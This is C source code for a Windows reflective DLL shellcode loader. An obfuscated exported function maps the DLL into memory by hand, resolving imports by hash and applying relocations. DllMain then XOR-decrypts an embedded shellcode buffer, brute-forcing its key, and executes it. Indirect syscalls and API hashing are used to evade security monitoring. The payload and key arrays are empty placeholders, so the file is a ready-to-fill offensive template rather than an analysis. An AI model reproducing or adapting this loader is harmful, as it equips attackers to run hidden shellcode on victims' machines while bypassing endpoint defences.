# include "../Include/hashycalls.h"
# include "../Include/HellsHall.h"

# define REFLECTIVE_FUNCTION_NAME IyKebSSlaSsdfyD

# define INTERNET_FLAG_HYPERLINK 0x00000400
# define INTERNET_FLAG_IGNORE_CERT_DATE_INVALID  0x00002000

# define USE_ENCRYPTION

typedef BOOL(WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);

typedef struct _BASE_RELOC_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
}BASE_RELOC_ENTRY, * PBASE_RELOC_ENTRY;

extern void* __cdecl memcpy(void*, void*, size_t);
#pragma intrinsic(memcpy)
#pragma function(memcpy)
void* __cdecl memcpy(void* destination, void* source, size_t length) {
    PBYTE D = (PBYTE)destination;
    PBYTE S = (PBYTE)source;

    while (length--) {
        *D++ = *S++;
    }

    return destination;
}

extern __declspec(dllexport) BOOL REFLECTIVE_FUNCTION_NAME() {
    SYSTEM_CALLS_TABLE          SyscallTable            = { 0 };
    DLL                         NtDll                   = { 0 };
    ULONG_PTR                   DllBaseAddr             = 0,
                                TmpAddr                 = 0,
                                FunctionAddr            = 0,
                                BaseRelocOffset         = 0;
    fnDllMain                   DllMainFunc             = 0;
    PBYTE                       NewDllBaseAddr          = 0;
    PIMAGE_DOS_HEADER           pDosHeader              = 0;
    PIMAGE_NT_HEADERS           pNtHeader               = 0;
    PIMAGE_SECTION_HEADER       pSection                = 0;
    PIMAGE_DATA_DIRECTORY       pImportDirectory        = 0;
    PIMAGE_EXPORT_DIRECTORY     pExportDirectory        = 0;
    PIMAGE_IMPORT_DESCRIPTOR    pDllDescriptor          = 0;
    PIMAGE_IMPORT_BY_NAME       FunctionData            = 0;
    PIMAGE_THUNK_DATA           pAddressTableData       = 0,
                                pNameTableData          = 0;
    PIMAGE_BASE_RELOCATION      BaseRelocation          = 0;
    PBASE_RELOC_ENTRY           BaseRelocEntry          = 0;
    NTSTATUS                    Status                  = 0;
    SIZE_T                      DllSize                 = 0,
                                ThunkSize               = 0,
                                RelocCount              = 0;
    HANDLE                      hModule                 = 0;
    PDWORD                      FunctionAddressArray    = 0;
    ULONG                       OldProtection           = 0;

    LOCATE_KERNEL32_FUNCTION(LoadLibraryA);

    if (!InitializeSystemCalls(&SyscallTable))
        return FALSE;

    /* Step 1; Locate the base address of this dll in memory by searching backwards for the images pe header
               from this functions location in memory */
    TmpAddr = (ULONG_PTR)REFLECTIVE_FUNCTION_NAME;
    while (TRUE) {
        pDosHeader = (PIMAGE_DOS_HEADER)TmpAddr;
        pNtHeader = (PIMAGE_NT_HEADERS)(TmpAddr + pDosHeader->e_lfanew);
        if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE && pNtHeader->Signature == IMAGE_NT_SIGNATURE) {
            DllBaseAddr = TmpAddr;
            DllSize = (SIZE_T)(pNtHeader->OptionalHeader.SizeOfImage);
            break;
        }
        TmpAddr--;
    }
    if (DllBaseAddr == 0 || DllSize == 0) {
        return FALSE;
    }


    /* Step 2; Allocate & copy this PE's section into memory */
    Status = NtAllocateVirtualMemory(&SyscallTable, (HANDLE)-1, &NewDllBaseAddr, 0, &DllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (Status != 0x0) {
        return FALSE;
    }
    pSection = IMAGE_FIRST_SECTION(pNtHeader);
    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        memcpy((PVOID)(NewDllBaseAddr + pSection[i].VirtualAddress), (PVOID)(DllBaseAddr + pSection[i].PointerToRawData), pSection[i].SizeOfRawData);
    }
    DllMainFunc = (fnDllMain)(NewDllBaseAddr + pNtHeader->OptionalHeader.AddressOfEntryPoint);

    /* Step 3; Resolve the import address table from the import name table */
    pImportDirectory = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    for (unsigned int i = 0; i < pImportDirectory->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        pDllDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(NewDllBaseAddr + pImportDirectory->VirtualAddress + i);
        if (!pDllDescriptor->OriginalFirstThunk && !pDllDescriptor->FirstThunk)
            break;

        if (!(hModule = LoadLibraryA_((LPCSTR)(NewDllBaseAddr + pDllDescriptor->Name))))
            return FALSE;

		ThunkSize = 0;
		
        while (TRUE) {
            FunctionAddr = 0;
            pNameTableData = (PIMAGE_THUNK_DATA)(NewDllBaseAddr + pDllDescriptor->OriginalFirstThunk + ThunkSize);
            pAddressTableData = (PIMAGE_THUNK_DATA)(NewDllBaseAddr + pDllDescriptor->FirstThunk + ThunkSize);
            if (!pNameTableData->u1.Function && !pAddressTableData->u1.Function) {
                break;
            }

            if (pNameTableData && (pNameTableData->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                PIMAGE_NT_HEADERS _pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModule + ((PIMAGE_DOS_HEADER)((ULONG_PTR)hModule))->e_lfanew);
                if (_pNtHeader->Signature != IMAGE_NT_SIGNATURE)
                    return FALSE;

                pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)hModule + _pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                FunctionAddressArray = (PDWORD)((ULONG_PTR)hModule + pExportDirectory->AddressOfFunctions);
                FunctionAddr = ((ULONG_PTR)hModule + FunctionAddressArray[pNameTableData->u1.Ordinal]);
            }
            else {
                FunctionAddr = (ULONG_PTR)GetProcAddressByHash(hModule, HashString(((PIMAGE_IMPORT_BY_NAME)(NewDllBaseAddr + pNameTableData->u1.AddressOfData))->Name));
            }

            if (!FunctionAddr)
                return FALSE;

            pAddressTableData->u1.Function = FunctionAddr;

            ThunkSize += sizeof(IMAGE_THUNK_DATA);
        }
    }

    /* Step 4; Perform base relocations */
    pNtHeader = (PIMAGE_NT_HEADERS)(DllBaseAddr + pDosHeader->e_lfanew);
    BaseRelocation = (PIMAGE_BASE_RELOCATION)(NewDllBaseAddr + pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    BaseRelocOffset = (ULONG_PTR)NewDllBaseAddr - pNtHeader->OptionalHeader.ImageBase;
    while (BaseRelocation->VirtualAddress) {
        RelocCount = (BaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOC_ENTRY);
        BaseRelocEntry = (PBASE_RELOC_ENTRY)(BaseRelocation + 1);

        while (RelocCount--) {
            switch (BaseRelocEntry->Type) {
            case IMAGE_REL_BASED_DIR64:
                *((ULONG_PTR*)(NewDllBaseAddr + BaseRelocation->VirtualAddress + BaseRelocEntry->Offset)) += BaseRelocOffset;
                break;
            case IMAGE_REL_BASED_HIGHLOW:
                *((DWORD*)(NewDllBaseAddr + BaseRelocation->VirtualAddress + BaseRelocEntry->Offset)) += (DWORD)BaseRelocOffset;
                break;
            case IMAGE_REL_BASED_HIGH:
                *((WORD*)(NewDllBaseAddr + BaseRelocation->VirtualAddress + BaseRelocEntry->Offset)) += HIWORD(BaseRelocOffset);
                break;
            case IMAGE_REL_BASED_LOW:
                *((WORD*)(NewDllBaseAddr + BaseRelocation->VirtualAddress + BaseRelocEntry->Offset)) += LOWORD(BaseRelocOffset);
                break;
            case IMAGE_REL_BASED_ABSOLUTE:
                break;
            default:
                return FALSE;
            }
            BaseRelocEntry += sizeof(BASE_RELOC_ENTRY);
        }
        BaseRelocation = (PIMAGE_BASE_RELOCATION)BaseRelocEntry;
    }

    /* Step 5; set memory permissions to executable. */
    Status = NtProtectVirtualMemory(&SyscallTable, (HANDLE)-1, &NewDllBaseAddr, &DllSize, PAGE_EXECUTE_READ, &OldProtection);
    if (Status != 0x00) {
        return FALSE;
    }

    /* Step 6; call the entry point of this module */
    NtFlushInstructionCache(&SyscallTable, (HANDLE)-1, 0, 0);
    return DllMainFunc((HMODULE)NewDllBaseAddr, DLL_PROCESS_ATTACH, NULL);
}

# ifdef USE_ENCRYPTION
VOID Xor(PBYTE pData, SIZE_T SizeOfData, PBYTE pKey, SIZE_T SizeOfKey) {
    for (int i = 0, j = 0; i < SizeOfData; i++, j++) {
        if (j >= SizeOfKey) {
            j = 0;
        }
        pData[i] = pData[i] ^ pKey[j];
    }
}

PBYTE DecryptKey(BYTE HintByte, PBYTE EncryptedKey, SIZE_T KeySize, PSYSTEM_CALLS_TABLE pSyscallTable) {
    BYTE  KeyByte = 0;
    NTSTATUS Status = 0;
    SIZE_T _KeySize = KeySize;
    PBYTE OriginalKey = 0;

    if ((Status = NtAllocateVirtualMemory(pSyscallTable, (HANDLE)-1, &OriginalKey, 0, &_KeySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x0)
        return NULL;

    while (TRUE) { if (((EncryptedKey[0] ^ KeyByte) - 0) == HintByte) { break; } else { KeyByte++; } }
    for (int i = 0; i < KeySize; i++) {
        OriginalKey[i] = (BYTE)((EncryptedKey[i] ^ KeyByte) - i);
    }
    return OriginalKey;
}
# endif

VOID Payload() {

    SIZE_T              BytesWritten    = 0;
    ULONG               OldProtection   = 0;
    PBYTE               DecryptedKey    = 0,
                        Payload         = 0;
    SYSTEM_CALLS_TABLE  SyscallTable    = { 0 };

# ifdef USE_ENCRYPTION
    BYTE                HintByte        = 0x00;

    char Key[]          = { 0x00 };
# endif

	char shellcode[]    = { 0x00 };

    SIZE_T PayloadSize = sizeof(shellcode);

    /* Get system call information */
    if (!InitializeSystemCalls(&SyscallTable))
        return;

    /* Decrypt the shellcode encryption key */
# ifdef USE_ENCRYPTION
    if ((DecryptedKey = DecryptKey(HintByte, Key, sizeof(Key), &SyscallTable)) == NULL)
        return;
# endif
    /* Allocate & write encrypted shellcode to memory */
    if ((NtAllocateVirtualMemory(&SyscallTable, (HANDLE)-1, &Payload, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x0)
        return;

    if ((NtWriteVirtualMemory(&SyscallTable, (HANDLE)-1, (LPVOID)Payload, (LPCVOID)shellcode, sizeof(shellcode), &BytesWritten)) != 0x0)
        return;

    /* Decrypt shellcode */
# ifdef USE_ENCRYPTION
    Xor(Payload, sizeof(shellcode), DecryptedKey, sizeof(Key));
# endif

    /* Set memory protections on payload to execute */
    if ((NtProtectVirtualMemory(&SyscallTable, (HANDLE)-1, &Payload, &PayloadSize, PAGE_EXECUTE, &OldProtection)) != 0x0)
        return;

    /* Execute the payload via function pointer */
    (*(int(*)()) Payload)();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:

        Payload();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

